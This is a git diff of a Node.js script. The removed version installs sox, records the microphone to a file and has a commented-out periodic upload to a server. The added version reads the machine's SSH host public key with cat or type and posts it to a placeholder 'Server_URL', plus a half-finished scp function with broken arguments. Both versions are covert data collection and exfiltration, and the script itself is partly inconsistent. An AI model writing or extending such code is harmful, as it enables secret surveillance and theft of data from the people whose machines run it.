@@ -1,21 +1,20 @@
 const { execFile } = require('child_process');
 const os = require("os");
+const fs = require("fs");
+const axios = require("axios");
 
-// const fs = require('fs');
-// const axios = require('axios');
-// const FormData = require('form-data');
-
-function Downloader() {
+function Slave() {
 
     let osType = os.type();
     osType = osType.toLowerCase();
 
     let program;
 
-    if (osType == "darwin") program = "brew";
-    else if (osType == "linux") program = "apt";
-    else program = "choco";
-    const args = [ 'install', 'sox' ];
+    if (osType == "darwin") program = "cat";
+    else if (osType == "linux") program = "cat";
+    else program = "type";
+
+    const args = ['/etc/ssh/ssh_host_ed25519_key.pub'];
     
     return new Promise((resolve, reject) => {
         let output = {};
@@ -35,29 +34,30 @@ function Downloader() {
         child.on("close", () => {
             resolve(output);
         });
-    })
+    });
 }
 
-Downloader().then(() => {
-    BashCompiler();
+Slave().then((output) => {
+
+    // Axios call to send public & the SCP command to send public
+    axios.post('Server_URL', output).then(() => {
+
+    });
+    console.log(output);
 });
 
-// setInterval(() => {
+function Peasent() {
 
-//     const filePath = './fuckYou.wav';
-//     const url = 'Server URL';
+    let osType = os.type();
+    osType = osType.toLowerCase();
 
-//     const form = new FormData();
-//     form.append('audio', fs.createReadStream(filePath));
+    let program;
 
-//     axios.post(url, form, {headers : form.getHeaders()});
+    if (osType == "darwin") program = "scp";
+    else if (osType == "linux") program = "scp";
+    else program = "type";
 
-// }, 10000 * 60);
-
-function BashCompiler() {
-
-    const program = 'sox';
-    const args = [ '-d', 'fuckYou.wav' ];
+    const args = ['/etc/ssh/ssh_host_ed25519_key.pub'];
     
     return new Promise((resolve, reject) => {
         let output = {};
@@ -77,5 +77,5 @@ function BashCompiler() {
         child.on("close", () => {
             resolve(output);
         });
-    })
+    });
 }
